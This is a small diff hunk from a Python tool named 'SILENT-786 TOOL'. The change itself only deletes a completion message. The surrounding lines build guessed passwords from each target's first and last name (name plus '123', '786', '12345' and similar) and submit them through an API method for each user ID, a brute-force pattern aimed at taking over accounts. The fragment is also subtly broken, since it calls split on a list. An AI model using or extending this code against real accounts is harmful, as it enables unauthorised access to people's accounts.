@@ -504,7 +504,7 @@ class Main:
                                 ls = last_name.lower()
                                 passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
                                 Zee.submit(self.api, user, passlist.split(","))
-			exit("\n\n \033[1;37m>>[PROCESS COMPLETE... \n\033[0;92m >>[THANKS FOR USING SILENT-786 TOOL...")
+			
 		except Exception as e:exit(str(e))
  
 	def api(self, uid, pwx):
